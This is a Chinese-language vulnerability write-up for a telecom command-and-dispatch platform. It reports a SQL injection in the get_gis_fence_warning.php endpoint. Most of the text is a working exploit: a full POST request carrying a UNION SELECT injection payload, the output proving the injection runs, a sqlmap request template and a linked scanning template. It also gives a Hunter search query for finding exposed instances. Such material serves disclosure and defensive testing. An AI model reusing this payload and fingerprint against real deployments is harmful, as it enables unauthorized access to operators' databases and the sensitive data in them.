# 指挥调度平台get_gis_fence_warning存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。</font>指挥调度平台get_gis_fence_warning存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 指挥调度平台

# 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/BGHJmd0Vs536cinb/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-858315.png)

# 四、漏洞复现
```plain
POST /api/client/get_gis_fence_warning.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 138

usernumber=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(111*111 AS CHAR),0x20),0x7162707671),NULL,NULL,NULL,NULL,NULL-- -
```

![1705368432160-49c93ef1-c200-4953-984d-7ebffe2c4705.png](./img/BGHJmd0Vs536cinb/1705368432160-49c93ef1-c200-4953-984d-7ebffe2c4705-770391.png)

```plain
qbpzq12321qbpvq
```

sqlmap

```plain
POST /api/client/get_gis_fence_warning.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 138

usernumber=1
```

![1705368573688-a697002f-062d-4ea4-88d1-c7e68407ba75.png](./img/BGHJmd0Vs536cinb/1705368573688-a697002f-062d-4ea4-88d1-c7e68407ba75-867695.png)

[福建科立讯通信-指挥调度平台-get-gis-fence-warning-sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222143857-625cde56-ac55-4d9f-83ab-c5df6957533e.yaml)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/arehbbh2c0r4whc1>